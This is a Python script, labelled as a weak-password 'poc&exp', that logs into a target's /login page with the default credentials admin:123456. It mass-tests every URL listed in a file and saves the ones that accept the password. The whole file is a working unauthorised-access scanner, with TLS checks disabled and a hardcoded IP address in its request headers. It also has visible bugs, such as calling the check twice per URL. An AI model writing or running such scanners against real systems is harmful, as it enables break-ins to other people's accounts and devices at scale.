import argparse
import textwrap
import time

import requests

requests.packages.urllib3.disable_warnings()
def main(url):
    full_url = f"{url}/login"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
                     "Accept": "*/*", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                     "Accept-Encoding": "gzip, deflate",
                     "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                     "X-Requested-With": "XMLHttpRequest", "Origin": "http://47.101.64.209:8099", "Connection": "close",
                     "Referer": "http://47.101.64.209:8099/toLogin"}
    data = {"userName": "admin", "password": "123456"}
    try:
        response = requests.post(full_url, headers=headers, data=data, allow_redirects=False, verify=False, timeout=5)
    except Exception:
        print(f"[-]{url}请求失败")
        return
    dic = response.json()
    if dic.get("code") == 200 and dic.get("msg") == None:
        print(f"[+]{url}存在默认口令 admin:123456")
        return url
    else:
        print(f"[-]{url}不存在默认口令")
if __name__ == '__main__':

    banner = """
 _______           _______  _        _______           _       
(  ____ )|\     /|(  ___  )| \    /\(  ___  )|\     /|( \      
| (    )|| )   ( || (   ) ||  \  / /| (   ) || )   ( || (      
| (____)|| |   | || |   | ||  (_/ / | |   | || |   | || |      
|     __)| |   | || |   | ||   _ (  | |   | || |   | || |      
| (\ (   | |   | || |   | ||  ( \ \ | |   | || |   | || |      
| ) \ \__| (___) || (___) ||  /  \ \| (___) || (___) || (____/\
|/   \__/(_______)(_______)|_/    \/(_______)(_______)(_______/
                                                    version: 1.0.1
                                                     author : tianxin
    """
    print(banner)
    parser = argparse.ArgumentParser(description='ruokouling poc&exp',
                                     formatter_class=argparse.RawDescriptionHelpFormatter,
                                     epilog=textwrap.dedent('''example:
                ruo.py -u http://192.168.1.108
                '''))
    parser.add_argument("-u", "--url", dest="url", type=str, help=" example: http://www.mhx.com")
    args = parser.parse_args()

    main(args.url)
    start_time = time.time()
    res_url = []
    with open("url.txt", mode="r", encoding="u8") as f:
        for line in f:
            line = line.strip()
            main(line)
            url = main(line)
            if url:
                res_url.append(url)
    with open("res2.txt", mode="w", encoding="u8") as f:
        for i in res_url:
            f.write(f"{i}\n")
    end_time = time.time()
    print(f"all done,task {end_time-start_time} s")
